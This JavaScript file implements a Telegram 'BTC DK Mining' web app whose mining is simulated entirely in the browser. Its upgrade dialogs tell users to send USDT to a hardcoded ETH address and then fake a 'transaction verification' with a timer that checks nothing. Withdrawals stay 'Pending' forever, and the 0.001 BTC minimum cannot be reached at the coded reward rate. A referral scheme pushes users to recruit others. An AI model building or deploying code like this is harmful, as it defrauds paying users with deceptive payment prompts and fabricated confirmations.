// BTC DK MINING - PROFESSIONAL EDITION
// Enterprise Grade Mining Interface
// With PERSISTENT MINING - Never loses progress

// ============================================
// GAME STATE - PREMIUM CONFIGURATION
// ============================================
const gameState = {
    // Balance & Mining - ULTRA PRECISE (15 decimal places)
    balance: 0.000000000000001,
    totalMined: 0.000000000000001,
    miningSpeed: 9,
    baseMiningAmount: 0.000000000000001,
    
    // Session Management - PERSISTENT
    isAutoMining: false,
    miningSessionStart: null,     // Track when session started
    miningSessionEnd: null,       // Track when session ends
    lastMinedTime: null,         // Track last mining cycle
    pendingRewards: 0,           // Accumulated rewards while away
    miningInterval: null,
    timerInterval: null,
    
    // Upgrades
    upgrades: {
        speedLevel: 0,
        efficiencyLevel: 0,
        maxSpeedLevel: 10,
        maxEfficiencyLevel: 5,
        speedCost: 29.99,
        efficiencyCost: 79.99
    },
    
    // Payment Configuration
    payments: {
        ethAddress: "0x742d35Cc6634C0532925a3b844Bc9e34F3bA2E1c",
        network: "ERC-20",
        confirmations: 3
    },
    
    // Referral System
    referral: {
        code: generateReferralCode(),
        count: 0,
        earnings: 0,
        tier: 'Bronze',
        commission: 5,
        history: []
    },
    
    // Withdrawal History
    withdrawalHistory: []
};

// ============================================
// GENERATE UNIQUE REFERRAL CODE
// ============================================
function generateReferralCode() {
    const tg = window.Telegram?.WebApp;
    const userId = tg?.initDataUnsafe?.user?.id || Math.floor(Math.random() * 1000000);
    return `ref_${userId}_${Math.random().toString(36).substring(2, 8)}`;
}

// ============================================
// TELEGRAM WEB APP INITIALIZATION
// ============================================
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.expand();
    tg.ready();
    tg.setHeaderColor?.(document.body.style.backgroundColor);
    tg.setBackgroundColor?.(document.body.style.backgroundColor);
}

// ============================================
// FORMAT BTC WITH 15 DECIMAL PLACES - NO SCIENTIFIC NOTATION
// ============================================
function formatBTC(value) {
    if (value === 0) return "0.000000000000000";
    
    let str = value.toFixed(15);
    
    if (str.includes('e')) {
        const exp = parseInt(str.split('e-')[1]);
        const base = str.split('e-')[0];
        const decimal = base.split('.')[1] || '';
        const zeros = '0'.repeat(exp - 1);
        str = '0.' + zeros + decimal.replace('.', '');
    }
    
    if (str.length < 17) {
        const parts = str.split('.');
        if (parts.length === 1) {
            str = parts[0] + '.' + '0'.repeat(15);
        } else {
            str = parts[0] + '.' + parts[1] + '0'.repeat(15 - parts[1].length);
        }
    }
    
    return str;
}

// ============================================
// LOAD / SAVE STATE
// ============================================
function loadGameState() {
    try {
        const saved = localStorage.getItem('btcDKMining_pro');
        if (saved) {
            const parsed = JSON.parse(saved);
            Object.assign(gameState, parsed);
            
            // CRITICAL: Check if mining session was active and calculate missed rewards
            if (gameState.miningSessionEnd && new Date(gameState.miningSessionEnd) > new Date()) {
                // Session is still valid - calculate rewards earned while away
                calculateMissedRewards();
                // Resume mining session
                startMiningSession();
            } else {
                // Session expired
                gameState.isAutoMining = false;
                gameState.miningSessionEnd = null;
                gameState.miningSessionStart = null;
                gameState.lastMinedTime = null;
                gameState.pendingRewards = 0;
            }
        }
    } catch (e) {
        console.error('Error loading state:', e);
    }
    
    updateUI();
    updateUSDValues();
    updateReferralUI();
}

function saveGameState() {
    try {
        localStorage.setItem('btcDKMining_pro', JSON.stringify(gameState));
    } catch (e) {
        console.error('Error saving state:', e);
    }
}

// ============================================
// CRITICAL: CALCULATE REWARDS EARNED WHILE AWAY
// ============================================
function calculateMissedRewards() {
    if (!gameState.lastMinedTime || !gameState.isAutoMining) return;
    
    const now = new Date();
    const lastMined = new Date(gameState.lastMinedTime);
    const sessionEnd = new Date(gameState.miningSessionEnd);
    
    // Don't calculate beyond session end
    const calculationEnd = now > sessionEnd ? sessionEnd : now;
    
    // Calculate time difference in seconds
    const secondsSinceLastMine = (calculationEnd - lastMined) / 1000;
    
    // Calculate mining parameters
    const miningSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
    const miningAmount = gameState.baseMiningAmount * Math.pow(2, gameState.upgrades.efficiencyLevel);
    
    // Calculate how many cycles were missed
    const missedCycles = Math.floor(secondsSinceLastMine / miningSpeed);
    
    if (missedCycles > 0) {
        // Calculate total rewards for missed cycles
        const missedRewards = missedCycles * miningAmount;
        
        // Add to balance
        gameState.balance += missedRewards;
        gameState.totalMined += missedRewards;
        gameState.pendingRewards = missedRewards;
        
        // Update last mined time
        gameState.lastMinedTime = new Date(lastMined.getTime() + (missedCycles * miningSpeed * 1000)).toISOString();
        
        // Show notification if significant rewards earned
        if (missedRewards > 0 && tg) {
            tg.showAlert(`⏰ While you were away:\n+${formatBTC(missedRewards)} BTC mined!`);
        }
    }
    
    saveGameState();
}

// ============================================
// UI UPDATES
// ============================================
function updateUI() {
    updateElement('balance', formatBTC(gameState.balance));
    updateElement('available-balance', formatBTC(gameState.balance));
    updateElement('total-mined', formatBTC(gameState.totalMined));
    
    const currentSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
    const miningAmount = gameState.baseMiningAmount * Math.pow(2, gameState.upgrades.efficiencyLevel);
    
    updateElement('mining-speed', currentSpeed);
    updateElement('mining-amount', formatBTC(miningAmount));
    updateElement('next-reward', formatBTC(miningAmount) + ' BTC');
    
    updateElement('speed-level', gameState.upgrades.speedLevel);
    updateElement('speed-level-display', gameState.upgrades.speedLevel);
    updateElement('efficiency-level', gameState.upgrades.efficiencyLevel);
    updateElement('efficiency-level-display', gameState.upgrades.efficiencyLevel);
    
    updateElement('current-mining-speed', currentSpeed);
    updateElement('next-speed', Math.max(3, currentSpeed - 3));
    
    const currentMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel);
    const nextMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel + 1);
    updateElement('current-multiplier', currentMultiplier);
    updateElement('next-multiplier', nextMultiplier);
    
    const mineBtn = document.getElementById('mine-btn');
    if (mineBtn) {
        if (gameState.isAutoMining) {
            mineBtn.innerHTML = '⚡ Mining Session Active';
            mineBtn.disabled = true;
        } else {
            mineBtn.innerHTML = '⚡ Start 2-Hour Mining Session';
            mineBtn.disabled = false;
        }
    }
    
    updateUpgradeButtons();
    updateTimerDisplay();
    updateWithdrawalHistory();
}

function updateElement(id, value) {
    const el = document.getElementById(id);
    if (el) el.textContent = value;
}

// ============================================
// USD VALUE CONVERSION
// ============================================
const BTC_TO_USD = 45000;

function updateUSDValues() {
    const balanceUSD = gameState.balance * BTC_TO_USD;
    updateElement('balance-usd', balanceUSD.toFixed(8));
    updateElement('available-usd', balanceUSD.toFixed(8));
}

// ============================================
// MINING SESSION MANAGEMENT - PERSISTENT
// ============================================
function startMining() {
    if (gameState.isAutoMining) return;
    
    const now = new Date();
    gameState.miningSessionStart = now.toISOString();
    gameState.miningSessionEnd = new Date(now.getTime() + (2 * 60 * 60 * 1000)).toISOString();
    gameState.lastMinedTime = now.toISOString();
    gameState.isAutoMining = true;
    gameState.pendingRewards = 0;
    
    startMiningSession();
    saveGameState();
    
    if (tg) {
        tg.showAlert('✓ 2-hour mining session initiated\nMining continues even when you leave!');
    }
}

function startMiningSession() {
    if (gameState.miningInterval) clearInterval(gameState.miningInterval);
    if (gameState.timerInterval) clearInterval(gameState.timerInterval);
    
    const miningSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
    const miningAmount = gameState.baseMiningAmount * Math.pow(2, gameState.upgrades.efficiencyLevel);
    
    // Main mining interval
    gameState.miningInterval = setInterval(() => {
        if (!gameState.isAutoMining) {
            clearInterval(gameState.miningInterval);
            return;
        }
        
        const now = new Date();
        const sessionEnd = new Date(gameState.miningSessionEnd);
        
        if (now >= sessionEnd) {
            endMiningSession();
            return;
        }
        
        // Add mining reward
        gameState.balance += miningAmount;
        gameState.totalMined += miningAmount;
        gameState.lastMinedTime = now.toISOString();
        
        updateUI();
        updateUSDValues();
        saveGameState();
        animateProgress();
        
    }, miningSpeed * 1000);
    
    // Timer update interval
    gameState.timerInterval = setInterval(updateTimerDisplay, 1000);
}

function endMiningSession() {
    gameState.isAutoMining = false;
    gameState.miningSessionEnd = null;
    gameState.miningSessionStart = null;
    gameState.lastMinedTime = null;
    gameState.pendingRewards = 0;
    
    if (gameState.miningInterval) {
        clearInterval(gameState.miningInterval);
        gameState.miningInterval = null;
    }
    
    if (gameState.timerInterval) {
        clearInterval(gameState.timerInterval);
        gameState.timerInterval = null;
    }
    
    updateUI();
    saveGameState();
    
    if (tg) {
        tg.showAlert('⏹ 2-hour mining session completed!\nStart a new session to continue mining.');
    }
}

// ============================================
// TIMER DISPLAY
// ============================================
function updateTimerDisplay() {
    const timerDisplay = document.getElementById('timer-display');
    const timerLabel = document.getElementById('timer-label');
    const sessionProgress = document.getElementById('session-progress');
    
    if (!timerDisplay) return;
    
    if (gameState.isAutoMining && gameState.miningSessionEnd) {
        const now = new Date();
        const end = new Date(gameState.miningSessionEnd);
        const diff = end - now;
        
        if (diff <= 0) {
            endMiningSession();
            return;
        }
        
        const hours = Math.floor(diff / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
        
        timerDisplay.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        timerLabel.textContent = 'ACTIVE MINING SESSION';
        if (sessionProgress) sessionProgress.textContent = `${hours}h ${minutes}m remaining`;
    } else {
        timerDisplay.textContent = '--:--:--';
        timerLabel.textContent = 'NO ACTIVE SESSION';
        if (sessionProgress) sessionProgress.textContent = 'No active session';
    }
}

// ============================================
// PROGRESS ANIMATION
// ============================================
function animateProgress() {
    const progressBar = document.getElementById('progress');
    const progressText = document.getElementById('progress-text');
    
    if (progressBar && progressText) {
        progressBar.style.transition = 'none';
        progressBar.style.width = '0%';
        
        const miningSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
        
        setTimeout(() => {
            progressBar.style.transition = `width ${miningSpeed}s linear`;
            progressBar.style.width = '100%';
            
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += 1;
                if (progressText) progressText.textContent = `${progress}%`;
                if (progress >= 100) {
                    clearInterval(progressInterval);
                    progressText.textContent = '0%';
                }
            }, miningSpeed * 10);
        }, 10);
    }
}

// ============================================
// UPGRADE SYSTEM
// ============================================
function buyUpgrade(type) {
    if (type === 'speed') {
        if (gameState.upgrades.speedLevel >= gameState.upgrades.maxSpeedLevel) {
            if (tg) tg.showAlert('Maximum speed level reached (10/10)');
            return;
        }
        
        const cost = gameState.upgrades.speedCost;
        const nextSpeed = Math.max(3, gameState.miningSpeed - ((gameState.upgrades.speedLevel + 1) * 3));
        
        if (tg) {
            tg.showConfirm(
                `⚡ Speed Acceleration Upgrade\n\n` +
                `Investment: $${cost} USDT\n` +
                `Current Speed: ${Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3))}s\n` +
                `New Speed: ${nextSpeed}s\n` +
                `Level: ${gameState.upgrades.speedLevel + 1}/10\n\n` +
                `Send $${cost} USDT (ERC-20) to:\n${gameState.payments.ethAddress}`,
                (confirmed) => {
                    if (confirmed) {
                        processUpgrade('speed', cost);
                    }
                }
            );
        }
    }
    
    if (type === 'efficiency') {
        if (gameState.upgrades.efficiencyLevel >= gameState.upgrades.maxEfficiencyLevel) {
            if (tg) tg.showAlert('Maximum efficiency level reached (5/5)');
            return;
        }
        
        const cost = gameState.upgrades.efficiencyCost;
        const nextMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel + 1);
        
        if (tg) {
            tg.showConfirm(
                `💎 Hashrate Multiplier Upgrade\n\n` +
                `Investment: $${cost} USDT\n` +
                `Current Multiplier: ${Math.pow(2, gameState.upgrades.efficiencyLevel)}x\n` +
                `New Multiplier: ${nextMultiplier}x\n` +
                `Level: ${gameState.upgrades.efficiencyLevel + 1}/5\n\n` +
                `Send $${cost} USDT (ERC-20) to:\n${gameState.payments.ethAddress}`,
                (confirmed) => {
                    if (confirmed) {
                        processUpgrade('efficiency', cost);
                    }
                }
            );
        }
    }
}

function processUpgrade(type, cost) {
    if (tg) {
        tg.showAlert(`⏳ Transaction verification in progress...\nUpgrade will activate within 60 seconds`);
    }
    
    setTimeout(() => {
        if (type === 'speed') {
            gameState.upgrades.speedLevel++;
            gameState.upgrades.speedCost = Math.min(99.99, gameState.upgrades.speedCost + 5);
            
            if (tg) {
                tg.showAlert(`✓ Speed Acceleration Level ${gameState.upgrades.speedLevel} Activated\nMining speed: ${Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3))}s per cycle`);
            }
        }
        
        if (type === 'efficiency') {
            gameState.upgrades.efficiencyLevel++;
            gameState.upgrades.efficiencyCost = Math.min(199.99, gameState.upgrades.efficiencyCost + 15);
            
            if (tg) {
                tg.showAlert(`✓ Hashrate Multiplier Level ${gameState.upgrades.efficiencyLevel} Activated\nOutput: ${Math.pow(2, gameState.upgrades.efficiencyLevel)}x per cycle`);
            }
        }
        
        if (gameState.isAutoMining) {
            startMiningSession();
        }
        
        updateUI();
        updateUpgradeButtons();
        saveGameState();
        
    }, 3000);
}

function updateUpgradeButtons() {
    const speedBtn = document.getElementById('speed-btn');
    if (speedBtn) {
        if (gameState.upgrades.speedLevel >= gameState.upgrades.maxSpeedLevel) {
            speedBtn.innerHTML = '✓ Maximum Level Reached';
            speedBtn.disabled = true;
        } else {
            speedBtn.innerHTML = `Purchase Speed Upgrade - $${gameState.upgrades.speedCost.toFixed(2)}`;
            speedBtn.disabled = false;
        }
    }
    
    const efficiencyBtn = document.getElementById('efficiency-btn');
    if (efficiencyBtn) {
        if (gameState.upgrades.efficiencyLevel >= gameState.upgrades.maxEfficiencyLevel) {
            efficiencyBtn.innerHTML = '✓ Maximum Level Reached';
            efficiencyBtn.disabled = true;
        } else {
            efficiencyBtn.innerHTML = `Purchase Efficiency Upgrade - $${gameState.upgrades.efficiencyCost.toFixed(2)}`;
            efficiencyBtn.disabled = false;
        }
    }
}

// ============================================
// REFERRAL SYSTEM
// ============================================
function updateReferralUI() {
    updateElement('referral-count', gameState.referral.count);
    updateElement('referral-earnings', formatBTC(gameState.referral.earnings));
    updateElement('referral-tier', gameState.referral.tier);
    updateElement('commission-rate', `${gameState.referral.commission}%`);
    
    const referralLink = document.getElementById('referral-link');
    if (referralLink) {
        const botUsername = 'Btcdkminingbot';
        referralLink.textContent = `https://t.me/${botUsername}?start=${gameState.referral.code}`;
    }
}

function copyReferralLink() {
    const link = `https://t.me/Btcdkminingbot?start=${gameState.referral.code}`;
    navigator.clipboard.writeText(link).then(() => {
        if (tg) {
            tg.showAlert('✓ Referral link copied!\n\nShare with friends to earn 5-15% commission.');
        }
    });
}

function shareTelegram() {
    const link = `https://t.me/Btcdkminingbot?start=${gameState.referral.code}`;
    const text = encodeURIComponent('⚡ Join me on BTC DK Mining and earn Bitcoin! Start mining instantly with my referral link:');
    window.open(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=${text}`, '_blank');
}

function shareWhatsApp() {
    const link = `https://t.me/Btcdkminingbot?start=${gameState.referral.code}`;
    const text = encodeURIComponent(`⚡ BTC DK Mining - Professional Bitcoin Mining Bot\n\nStart with 0.000000000000001 BTC per cycle.\n\nMy referral link: ${link}\n\nEarn Bitcoin while you sleep!`);
    window.open(`https://wa.me/?text=${text}`, '_blank');
}

function shareInvite() {
    const link = `https://t.me/Btcdkminingbot?start=${gameState.referral.code}`;
    if (tg) {
        tg.showAlert(`📨 Your Referral Link:\n\n${link}\n\nEarn ${gameState.referral.commission}% commission on friends' mining rewards!`);
    }
}

// ============================================
// WITHDRAWAL SYSTEM
// ============================================
function withdraw() {
    const amountInput = document.getElementById('withdraw-amount');
    const walletInput = document.getElementById('wallet-address');
    
    const amount = parseFloat(amountInput?.value || '0');
    const wallet = walletInput?.value.trim() || '';
    
    if (!amount || amount < 0.001) {
        if (tg) tg.showAlert('Minimum withdrawal: 0.001 BTC');
        return;
    }
    
    if (amount > gameState.balance) {
        if (tg) tg.showAlert(`Insufficient balance\nAvailable: ${formatBTC(gameState.balance)} BTC`);
        return;
    }
    
    if (!wallet || wallet.length < 26) {
        if (tg) tg.showAlert('Please enter a valid Bitcoin wallet address');
        return;
    }
    
    const fee = 0.0001;
    const netAmount = amount - fee;
    
    if (netAmount <= 0) {
        if (tg) tg.showAlert('Amount too small after network fee');
        return;
    }
    
    if (tg) {
        tg.showConfirm(
            `💰 Withdrawal Request\n\n` +
            `Amount: ${amount.toFixed(8)} BTC\n` +
            `Network Fee: ${fee.toFixed(8)} BTC\n` +
            `You Receive: ${netAmount.toFixed(8)} BTC\n` +
            `Destination: ${wallet.substring(0, 10)}...${wallet.substring(wallet.length - 6)}\n\n` +
            `Processing time: 1-24 hours`,
            (confirmed) => {
                if (confirmed) {
                    processWithdrawal(amount, netAmount, wallet, fee);
                }
            }
        );
    }
}

function processWithdrawal(amount, netAmount, wallet, fee) {
    gameState.balance -= amount;
    
    const withdrawal = {
        id: Date.now(),
        date: new Date().toISOString(),
        amount: amount,
        fee: fee,
        netAmount: netAmount,
        wallet: wallet,
        status: 'pending'
    };
    
    gameState.withdrawalHistory.unshift(withdrawal);
    
    updateUI();
    updateUSDValues();
    updateWithdrawalHistory();
    saveGameState();
    
    const amountInput = document.getElementById('withdraw-amount');
    const walletInput = document.getElementById('wallet-address');
    if (amountInput) amountInput.value = '';
    if (walletInput) walletInput.value = '';
    
    if (tg) {
        tg.showAlert(
            `✓ Withdrawal Request Submitted\n\n` +
            `Amount: ${netAmount.toFixed(8)} BTC\n` +
            `Status: Pending\n` +
            `Estimated completion: 1-24 hours`
        );
    }
}

function updateWithdrawalHistory() {
    const historyList = document.getElementById('history-list');
    if (!historyList) return;
    
    if (gameState.withdrawalHistory.length === 0) {
        historyList.innerHTML = '<div style="text-align: center; padding: 30px; background: rgba(255,255,255,0.02); border-radius: 16px; color: #5a6a78;">No withdrawal history</div>';
        return;
    }
    
    let html = '';
    gameState.withdrawalHistory.slice(0, 5).forEach(item => {
        const date = new Date(item.date).toLocaleDateString('en-US', {
            month: 'short',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        });
        
        html += `
            <div style="background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 16px; padding: 16px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">
                <div>
                    <div style="font-size: 14px; font-weight: 600; color: white;">${item.netAmount.toFixed(8)} BTC</div>
                    <div style="font-size: 12px; color: #5a6a78;">${date}</div>
                </div>
                <div>
                    <span style="padding: 6px 12px; border-radius: 100px; font-size: 12px; font-weight: 600; background: rgba(247,147,26,0.1); color: #f7931a; border: 1px solid rgba(247,147,26,0.2);">
                        Pending
                    </span>
                </div>
            </div>
        `;
    });
    
    historyList.innerHTML = html;
}

// ============================================
// UTILITIES
// ============================================
function copyAddress() {
    navigator.clipboard.writeText(gameState.payments.ethAddress).then(() => {
        if (tg) {
            tg.showAlert('✓ Payment address copied to clipboard');
        }
    });
}

function setMaxWithdraw() {
    const input = document.getElementById('withdraw-amount');
    if (input) {
        input.value = gameState.balance.toFixed(8);
        updateReceiveAmount();
    }
}

function updateReceiveAmount() {
    const amount = parseFloat(document.getElementById('withdraw-amount')?.value || '0');
    const receive = amount - 0.0001;
    const receiveEl = document.getElementById('receive-amount');
    if (receiveEl) {
        receiveEl.textContent = receive > 0 ? receive.toFixed(8) + ' BTC' : '0.00000000 BTC';
    }
}

// ============================================
// AUTO-SAVE - EVERY 10 SECONDS
// ============================================
setInterval(saveGameState, 10000);

// ============================================
// CRITICAL: CHECK FOR MISSED REWARDS ON PAGE LOAD
// ============================================
window.addEventListener('load', function() {
    loadGameState();
    
    const withdrawInput = document.getElementById('withdraw-amount');
    if (withdrawInput) {
        withdrawInput.addEventListener('input', updateReceiveAmount);
    }
    
    updateReferralUI();
    
    // Welcome message
    if (!localStorage.getItem('btcDKMining_welcome')) {
        setTimeout(() => {
            if (tg) {
                tg.showAlert(
                    '⚡ BTC DK MINING - Professional Edition\n\n' +
                    '✓ Mining continues even when you leave!\n' +
                    '✓ Auto-calculates rewards while away\n' +
                    '✓ 2-Hour mining sessions\n' +
                    '✓ USDT upgrades (ERC-20)\n' +
                    '✓ Referral rewards: 5-15% commission\n' +
                    '✓ Minimum withdrawal: 0.001 BTC\n\n' +
                    'Professional mining interface ready.'
                );
            }
            localStorage.setItem('btcDKMining_welcome', 'true');
        }, 1500);
    }
});

// ============================================
// EXPORT
// ============================================
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { gameState, startMining, buyUpgrade, withdraw, copyReferralLink };
}
